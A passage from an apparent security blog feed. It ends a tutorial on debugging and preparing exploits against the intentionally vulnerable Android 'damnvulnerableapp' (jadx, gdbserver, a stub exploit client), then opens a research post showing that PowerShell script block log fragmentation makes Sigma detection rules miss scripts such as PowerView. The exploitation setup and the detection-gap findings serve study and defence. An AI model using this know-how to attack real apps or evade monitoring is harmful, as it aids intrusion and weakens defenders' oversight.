&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ jadx-gui ./base.apk
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This decompiles a large portion of the app. Continuing the example of the &lt;em>OffByOneModule&lt;/em>, we can get the following decompiled code for the &lt;code>OffByOneModule&lt;/code> class:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#f92672">package&lt;/span> com.damnvulnerableapp.vulnerable.modules&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> com.damnvulnerableapp.common.exceptions.VulnerableModuleException&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/* loaded from: classes10.dex */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">OffByOneModule&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> VulnerableModule &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">logMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bArr&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadLibrary&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;OffByOneModule&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">OffByOneModule&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> OffByOneModuleConfiguration&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// com.damnvulnerableapp.vulnerable.modules.VulnerableModule
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> VulnerableModuleException &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Welcome to the most secure message logger in the world!&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Enter a message to log: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> message &lt;span style="color:#f92672">=&lt;/span> input&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>message &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Failed to receive the message to log...Better safe than sorry!&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>message&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EXIT&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Your logged message(s) were stored successfully.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>logMessage&lt;span style="color:#f92672">(&lt;/span>message&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="grabbing-system-libraries">Grabbing System Libraries&lt;/h3>
&lt;p>Often there are libraries, of which we have a leaked pointer. Having such a pointer is nice and all, but it will not help, if we do not have access to the corresponding shared - object file. Lets try to get access to &lt;code>libart.so&lt;/code>, the android runtime that runs the Java code we wrote for the app. Among other things, it handles native calls via trampoline functions like &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/arch/x86_64/quick_entrypoints_x86_64.S;l=1536">&lt;code>art_quick_generic_jni_trampoline&lt;/code>&lt;/a>.&lt;/p>
&lt;p>In order to find &lt;code>libart.so&lt;/code>, again assuming root access, running the &lt;em>damnvulnerableapp&lt;/em> reveals the binary that underlies the process:&lt;/p>
&lt;pre tabindex="0">&lt;code># ps -e | grep damn
u0_a107 4122 357 13798620 114268 do_epoll_wait 0 S com.damnvulnerableapp
# file /proc/4122/exe
/proc/4122/exe: symbolic link to /system/bin/app_process64
# readelf -d /system/bin/app_process64
...
0x0000000000000001 (NEEDED) Shared library: [libandroid_runtime.so]
0x0000000000000001 (NEEDED) Shared library: [libbinder.so]
0x0000000000000001 (NEEDED) Shared library: [libcutils.so]
0x0000000000000001 (NEEDED) Shared library: [libhidlbase.so]
0x0000000000000001 (NEEDED) Shared library: [liblog.so]
0x0000000000000001 (NEEDED) Shared library: [libnativeloader.so]
0x0000000000000001 (NEEDED) Shared library: [libsigchain.so]
0x0000000000000001 (NEEDED) Shared library: [libutils.so]
0x0000000000000001 (NEEDED) Shared library: [libwilhelm.so]
0x0000000000000001 (NEEDED) Shared library: [libc++.so]
0x0000000000000001 (NEEDED) Shared library: [libc.so]
0x0000000000000001 (NEEDED) Shared library: [libm.so]
0x0000000000000001 (NEEDED) Shared library: [libdl.so]
...
&lt;/code>&lt;/pre>&lt;p>This means that &lt;code>libart.so&lt;/code> will be loaded later on, i.e. not at startup. Further analysis reveals:&lt;/p>
&lt;pre tabindex="0">&lt;code># cat /proc/4122/maps | grep libart.so
730c03400000-730c0357b000 r--p 00000000 fe:0f 57 /apex/com.android.art/lib64/libart.so
730c0377a000-730c03e0b000 r-xp 0017a000 fe:0f 57 /apex/com.android.art/lib64/libart.so
730c0400a000-730c0401d000 r--p 0080a000 fe:0f 57 /apex/com.android.art/lib64/libart.so
730c0421c000-730c04220000 rw-p 0081c000 fe:0f 57 /apex/com.android.art/lib64/libart.so
# exit
$ adb pull /apex/com.android.art/lib64/libart.so ./libart.so
&lt;/code>&lt;/pre>&lt;p>After the above commands, &lt;code>libart.so&lt;/code> should be in our current working directory, ready to be analyzed via &lt;em>Ghidra&lt;/em>, &lt;a href="https://man7.org/linux/man-pages/man1/objdump.1.html">&lt;em>objdump&lt;/em>&lt;/a>(which will most likely not work, because &lt;em>objdump&lt;/em> does not recognize the architecture) or &lt;a href="https://man7.org/linux/man-pages/man1/readelf.1.html">&lt;em>readelf&lt;/em>&lt;/a>.&lt;/p>
&lt;p>There may be two unexpected aspects:&lt;/p>
&lt;ol>
&lt;li>Even if you do &lt;strong>not&lt;/strong> have root access on the emulator, it is possible to run &lt;code>adb pull &amp;lt;from remote&amp;gt; &amp;lt;to local&amp;gt;&lt;/code>. We only used root to access &lt;code>/proc/4122/maps&lt;/code> etc.&lt;/li>
&lt;li>The name of the binary that underlies &lt;em>damnvulnerableapp&lt;/em> is &lt;code>/system/bin/app_process64&lt;/code>. To that end, observe that Java apps are &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">forked from the zygote process&lt;/a>. The zygote process, among other things, initializes the JVM to allow for faster app starts.&lt;/li>
&lt;/ol>
&lt;h3 id="analysing-the-stack-trace">Analysing the Stack Trace&lt;/h3>
&lt;p>There is one more thing to consider. When given a leak, e.g. an address from the stack, then it is important to (partially) understand what values are located on the stack. To that end, one may write a small native app via &lt;em>Android Studio&lt;/em>, set a breakpoint on the native function and run the app. This could result in the following stack trace:&lt;/p>
&lt;pre tabindex="0">&lt;code>Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper EasyStackBufferOverflowModule.c:32
art_quick_generic_jni_trampoline 0x000071636dba032c
art_quick_invoke_stub 0x000071636db95015
art::ArtMethod::Invoke(art::Thread *, unsigned int *, unsigned int, art::JValue *, const char *) 0x000071636dc1d9fb
art::interpreter::ArtInterpreterToCompiledCodeBridge(art::Thread *, art::ArtMethod *, art::ShadowFrame *, unsigned short, art::JValue *) 0x000071636dda335d
art::interpreter::DoCall&amp;lt;…&amp;gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame &amp;amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d16d
art::interpreter::ExecuteSwitchImplCpp&amp;lt;…&amp;gt;(art::interpreter::SwitchImplContext *) 0x000071636dbac1d0
ExecuteSwitchImplAsm 0x000071636dba23d6
art::interpreter::ExecuteSwitch(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool) 0x000071636dd9ca6e
art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool, bool) 0x000071636dd94ae1
art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c
art::interpreter::DoCall&amp;lt;…&amp;gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame &amp;amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e
MterpInvokeVirtual 0x000071636e16e306
mterp_op_invoke_virtual 0x000071636db7e71a
art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool, bool) 0x000071636dd94b43
art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c
art::interpreter::DoCall&amp;lt;…&amp;gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame &amp;amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e
MterpInvokeVirtual 0x000071636e16e306
mterp_op_invoke_virtual 0x000071636db7e71a
art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool, bool) 0x000071636dd94b43
art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame *, art::JValue *) 0x000071636dd9c55c
art::interpreter::DoCall&amp;lt;…&amp;gt;(art::ArtMethod *, art::Thread *, art::ShadowFrame &amp;amp;, const art::Instruction *, unsigned short, art::JValue *) 0x000071636dd9d14e
MterpInvokeInterface 0x000071636e175bfd
mterp_op_invoke_interface 0x000071636db7e91a
art::interpreter::Execute(art::Thread *, const art::CodeItemDataAccessor &amp;amp;, art::ShadowFrame &amp;amp;, art::JValue, bool, bool) 0x000071636dd94b43
artQuickToInterpreterBridge 0x000071636e159a70
art_quick_to_interpreter_bridge 0x000071636dba04bd
&amp;lt;unknown&amp;gt; 0x000071636dba07c0
&lt;/code>&lt;/pre>&lt;p>This is a stack - trace of a module that will be exploited in a later post. The most important address is the return address of &lt;code>Java_com_damnvulnerableapp_vulnerable_modules_EasyStackBufferOverflowModule_vulnerableToUpper&lt;/code>, i.e the address into &lt;code>art_quick_generic_jni_trampoline: 0x000071636dba032c&lt;/code>. Depending on whether the native method is e.g. declared as &lt;code>static&lt;/code> or not, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/art_method.cc;l=369">different stubs&lt;/a> are called, which may result in different return addresses. Thus it might be beneficial to produce a small sample app with the same setup as the target app, especially w.r.t. access modifiers etc. of the native method, to get an idea of the stack - trace.&lt;/p>
&lt;h3 id="debugging-on-android">Debugging on Android&lt;/h3>
&lt;p>Another very important aspect of binary exploitation is &lt;em>debugging&lt;/em>. There are a lot of good resources out there (like &lt;a href="https://simoneaonzo.it/gdb-android/">1&lt;/a>, &lt;a href="https://wladimir-tm4pda.github.io/porting/debugging_gdb.html">2&lt;/a>). One possible debugger is &lt;a href="https://man7.org/linux/man-pages/man1/gdb.1.html">&lt;em>GDB&lt;/em>&lt;/a>. As &lt;em>GDB&lt;/em> by itself is pretty hard to use, I will use an extensions in this series, called &lt;a href="https://github.com/hugsy/gef">&lt;em>GEF&lt;/em>&lt;/a>. A prerequisite is that we have root access on the device/emulator.&lt;/p>
&lt;h4 id="starting-an-app-from-terminal">Starting an app from terminal&lt;/h4>
&lt;p>In order to debug an app, the app needs to run. In this case, as we are using a &amp;ldquo;special&amp;rdquo; app, we just need to run it without waiting for a debugger to attach. Running an app can be done as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ adb shell &lt;span style="color:#e6db74">&amp;#34;am start -n com.damnvulnerableapp/com.damnvulnerableapp.managerservice.ManagerActivity&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we assume that the app of choice is the &lt;em>DamnVulnerableApp&lt;/em>, which is the main focus of this series.&lt;/p>
&lt;p>From here onwards, the manager will run in the background and wait for incoming connections. Once a connection is established, the messages will be used to tell the manager what to do, like spawning a vulnerable module.&lt;/p>
&lt;h4 id="starting-an-exploit-script">Starting an exploit script&lt;/h4>
&lt;p>Assuming that connecting to a socket server is not a great challenge, right after the connection has been established and a vulnerable module selected, the exploit script should wait for the debugger to attach. This can be achieved like demonstrated in the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Need tcp forward, i.e. &amp;#39;adb forward tcp:8080 tcp:8080&amp;#39;&lt;/span>
client &lt;span style="color:#f92672">=&lt;/span> PwnClient(&lt;span style="color:#e6db74">&amp;#39;127.0.0.1&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">8080&lt;/span>)
client&lt;span style="color:#f92672">.&lt;/span>select(&lt;span style="color:#e6db74">&amp;#39;EasyStackBufferOverflowModule&amp;#39;&lt;/span>)
print(client&lt;span style="color:#f92672">.&lt;/span>fetch())
input(&lt;span style="color:#e6db74">&amp;#39;Press &amp;lt;enter&amp;gt; to continue...&amp;#39;&lt;/span>)
&lt;span style="color:#f92672">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is not &lt;em>the clean way&lt;/em>, but it works just fine.&lt;/p>
&lt;h4 id="attaching-gdb">Attaching gdb&lt;/h4>
&lt;p>Notice that selecting a module should spawn a new process that encapsulates the vulnerable module. Now we need a &lt;em>gdbserver&lt;/em>, which is part of the &lt;a href="https://developer.android.com/ndk">&lt;em>Android NDK&lt;/em>&lt;/a>. Uploading the &lt;em>gdbserver&lt;/em> to e.g. &lt;code>/data/local/tmp/gdbserver&lt;/code> will enable us to attach to running processes. The command history could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ adb push gdbserver /data/local/tmp/gdbserver
$ adb shell &lt;span style="color:#e6db74">&amp;#34;chmod 777 /data/local/tmp/gdbserver&amp;#34;&lt;/span>
$ adb forward tcp:1337 tcp:1337
$ adb shell &lt;span style="color:#e6db74">&amp;#34;/data/local/tmp/gdbserver :1337 --attach &lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>pidof com.damnvulnerableapp:VulnerableActivity&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
...
Listening on port &lt;span style="color:#ae81ff">1337&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We will make &lt;em>gdb&lt;/em> connect to port &lt;code>1337&lt;/code> for debugging. After the last command, the process will block until a debugger connects. Before that, we should provide gdb with all necessary symbol information that is helpful for debugging. Namely (inspired from &lt;a href="https://simoneaonzo.it/gdb-android/">here&lt;/a>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ mkdir ~/dbgtmp
$ adb pull /system/lib64 ~/dbgtmp
$ mkdir ~/dbgtmp/tmp
$ adb pull /apex/com.android.art/lib64 ~/dbgtmp/tmp
$ mv ~/dbgtmp/tmp/* ~/dbgtmp/lib64
$ cp ~/path/to/unpacked/apk/lib/x86_64/* ~/dbgtmp/lib64
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then, in &lt;em>gdb/gef&lt;/em> (taken from &lt;a href="https://wladimir-tm4pda.github.io/porting/debugging_gdb.html">here&lt;/a> and &lt;a href="https://simoneaonzo.it/gdb-android/">here&lt;/a>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ set solib-absolute-prefix ~/dbgtmp/
gef➤ set solib-search-path ~/dbgtmp/lib64/
gef➤ gef-remote :1337
...
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Connected to &lt;span style="color:#e6db74">&amp;#39;:1337&amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Remote information loaded to temporary path &lt;span style="color:#e6db74">&amp;#39;/tmp/gef/6695&amp;#39;&lt;/span>
gef➤ sharedlibrary
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The last command will take &lt;strong>ages&lt;/strong> to run, but its worth as we get access to almost all symbols we need (there is most likely a better way to do this). Basically we just need to do this once with all the libraries, then identify the libraries we are interested in and create a directory next to &lt;code>lib64&lt;/code> on our local machine that only contains this interesting subset of the shared - object files. This will speed up loading time by a lot!&lt;/p>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>We have seen some security mechanisms that will make the life of an attacker harder. Depending on the assumptions, like e.g. leaking an address, some mechanisms can be rendered useless. Also, we are now able to get limited source code access and debug Android apps using &lt;code>gdb&lt;/code>. This will allow us to exploit the available modules in &lt;em>damnvulnerableapp&lt;/em>.&lt;/p></content></item><item><title>*PowerView* is evil, but *PowerVi* and *ew* are legit, right? - Missing signature-based detections due to PowerShell Script Block Logging Fragmentation</title><link>https://lolcads.github.io/posts/2024/04/psscriptblockfragmentation/</link><pubDate>Mon, 15 Apr 2024 11:01:40 +0200</pubDate><guid>https://lolcads.github.io/posts/2024/04/psscriptblockfragmentation/</guid><description>PowerView is evil, but PowerVi and ew are legit, right? - Missing signature-based detections due to PowerShell Script Block Logging Fragmentation TL;DR: Sigma rules and similar signature-based threat detection measures may miss malicious PowerShell scripts due to unpredictable fragmentation of script block logs.
Introduction Sigma offers more than 3000 rules for signature-based threat detection. 140 of these rules aim to detect suspicious/malicious PowerShell scripts by looking into PowerShell script block logs.</description><content>&lt;h1 id="powerview-is-evil-but-powervi-and-ew-are-legit-right---missing-signature-based-detections-due-to-powershell-script-block-logging-fragmentation">&lt;em>PowerView&lt;/em> is evil, but &lt;em>PowerVi&lt;/em> and &lt;em>ew&lt;/em> are legit, right? - Missing signature-based detections due to PowerShell Script Block Logging Fragmentation&lt;/h1>
&lt;p>&lt;strong>TL;DR:&lt;/strong> Sigma rules and similar signature-based threat detection measures may miss malicious PowerShell scripts due to unpredictable fragmentation of script block logs.&lt;/p>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>&lt;a href="https://github.com/SigmaHQ/sigma">Sigma&lt;/a> offers more than 3000 rules for signature-based threat detection. 140 of these rules aim to detect suspicious/malicious PowerShell scripts by looking into PowerShell script block logs. Fragmentation of script blocks during Script Block Logging results in varying number of alerts when loading the same script multiple times. On the one hand, there is a trend of more alerts being generated when the script is split into more fragments (which is fine), but on the other hand, the fragmentation of scripts into blocks may result in missed detections.&lt;/p>
&lt;p>I know this is a lot, but bear with me as I tell you the whole story. If you are only interested in the juicy part, you can skip to &amp;lsquo;The case of split &amp;ldquo;PowerVi/ew&amp;rdquo;&amp;rsquo;.&lt;/p>
&lt;h2 id="the-uncertainty-of-script-block-logging">The Uncertainty of Script Block Logging&lt;/h2>
&lt;p>&lt;a href="https://devblogs.microsoft.com/powershell/powershell-the-blue-team/">It is known&lt;/a> that when loading a very large script, PowerShell breaks it into multiple parts before logging them - sometimes resulting in dozens of fragments. To illustrate this behavior, we loaded the well-known &lt;a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView&lt;/a> script a total of 10 times (on the same machine and configuration) and recorded into how many block fragments it was broken. The results are shown in the table below.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Run&lt;/th>
&lt;th>1&lt;/th>
&lt;th>2&lt;/th>
&lt;th>3&lt;/th>
&lt;th>4&lt;/th>
&lt;th>5&lt;/th>
&lt;th>6&lt;/th>
&lt;th>7&lt;/th>
&lt;th>8&lt;/th>
&lt;th>9&lt;/th>
&lt;th>10&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td># Blocks&lt;/td>
&lt;td>54&lt;/td>
&lt;td>76&lt;/td>
&lt;td>57&lt;/td>
&lt;td>49&lt;/td>
&lt;td>64&lt;/td>
&lt;td>57&lt;/td>
&lt;td>55&lt;/td>
&lt;td>69&lt;/td>
&lt;td>39&lt;/td>
&lt;td>47&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>We can see that the number of blocks ranges from 39 to 76, which is quite a significant difference.&lt;/p>
&lt;h2 id="more-script-blocks---more-alerts">More script blocks -&amp;gt; More alerts?&lt;/h2>
&lt;p>Now, when using Sigma rules that operate on single logged ScriptBlockTexts, the number of generated alerts might differ because the number of logged blocks differs. More specific, the number of generated alerts usually increases with increasing number of blocks, because the malicious/suspicious strings were found in more blocks. Using &amp;ldquo;all rules&amp;rdquo; from Sigma release &lt;a href="https://github.com/SigmaHQ/sigma/releases/tag/r2024-03-11">r2024-03-11&lt;/a> and the 10 recorded PowerView loadings, the following number of alerts were generated using &lt;a href="https://github.com/WithSecureLabs/chainsaw">Chainsaw&lt;/a> (sorted by number of blocks).&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Blocks&lt;/th>
&lt;th>39&lt;/th>
&lt;th>47&lt;/th>
&lt;th>49&lt;/th>
&lt;th>54&lt;/th>
&lt;th>55&lt;/th>
&lt;th>57&lt;/th>
&lt;th>57&lt;/th>
&lt;th>64&lt;/th>
&lt;th>69&lt;/th>
&lt;th>76&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Alarms&lt;/td>
&lt;td>79&lt;/td>
&lt;td>91&lt;/td>
&lt;td>94&lt;/td>
&lt;td>103&lt;/td>
&lt;td>99&lt;/td>
&lt;td>106&lt;/td>
&lt;td>107&lt;/td>
&lt;td>110&lt;/td>
&lt;td>119&lt;/td>
&lt;td>126&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;hellip; raised on &amp;hellip; blocks&lt;/td>
&lt;td>39&lt;/td>
&lt;td>46&lt;/td>
&lt;td>48&lt;/td>
&lt;td>53&lt;/td>
&lt;td>53&lt;/td>
&lt;td>56&lt;/td>
&lt;td>56&lt;/td>
&lt;td>60&lt;/td>
&lt;td>65&lt;/td>
&lt;td>70&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Here, we see that the number of alarms usually increases with the number of blocks - that is the expected behavior. The only run that does not match this trend is the one that generated 55 script blocks. Here, less alerts are generated than in the run generating 54 script blocks. Although this behavior leads to inconsistency, it can be considered &amp;ldquo;not too bad&amp;rdquo; since in some cases more alerts are generated than in other cases, but overall we still catch everything, right?&lt;/p>
&lt;h2 id="more-script-blocks---less-alerts">More script blocks -&amp;gt; Less alerts??&lt;/h2>
&lt;p>To investigate how the number of blocks influences the number of generated alerts, we further looked into the generated alarms. Below, the number of generated alerts for each triggered rule is listed for each of the 10 runs.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Rule / Run#Blocks&lt;/th>
&lt;th>9#39&lt;/th>
&lt;th>10#47&lt;/th>
&lt;th>4#49&lt;/th>
&lt;th>1#54&lt;/th>
&lt;th>7#55&lt;/th>
&lt;th>3#57&lt;/th>
&lt;th>6#57&lt;/th>
&lt;th>5#64&lt;/th>
&lt;th>8#69&lt;/th>
&lt;th>2#76&lt;/th>
&lt;th>AVG&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Total&lt;/td>
&lt;td>79&lt;/td>
&lt;td>91&lt;/td>
&lt;td>94&lt;/td>
&lt;td>103&lt;/td>
&lt;td>99&lt;/td>
&lt;td>106&lt;/td>
&lt;td>107&lt;/td>
&lt;td>110&lt;/td>
&lt;td>119&lt;/td>
&lt;td>126&lt;/td>
&lt;td>103.4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Execute Invoke-command on Remote Host&lt;/td>
&lt;td>5&lt;/td>
&lt;td>6&lt;/td>
&lt;td>6&lt;/td>
&lt;td>6&lt;/td>
&lt;td>6&lt;/td>
&lt;td>7&lt;/td>
&lt;td>6 [2]&lt;/td>
&lt;td>7&lt;/td>
&lt;td>7&lt;/td>
&lt;td>7&lt;/td>
&lt;td>6.3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Malicious PowerShell Commandlets - ScriptBlock&lt;/td>
&lt;td>35&lt;/td>
&lt;td>42&lt;/td>
&lt;td>43&lt;/td>
&lt;td>49&lt;/td>
&lt;td>46&lt;/td>
&lt;td>51&lt;/td>
&lt;td>51&lt;/td>
&lt;td>53&lt;/td>
&lt;td>58&lt;/td>
&lt;td>61&lt;/td>
&lt;td>48.9&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Malicious PowerShell Keywords&lt;/td>
&lt;td>3&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>3&lt;/td>
&lt;td>2&lt;/td>
&lt;td>3&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2.3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Manipulation of User Computer or Group Security Principals Across AD&lt;/td>
&lt;td>4&lt;/td>
&lt;td>4&lt;/td>
&lt;td>4&lt;/td>
&lt;td>6 [3]&lt;/td>
&lt;td>4&lt;/td>
&lt;td>4&lt;/td>
&lt;td>4&lt;/td>
&lt;td>4&lt;/td>
&lt;td>4&lt;/td>
&lt;td>&amp;lt;5&amp;gt;&lt;/td>
&lt;td>4.3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Potential In-Memory Execution Using Reflection.Assembly&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Potential Suspicious PowerShell Keywords&lt;/td>
&lt;td>1 [1]&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
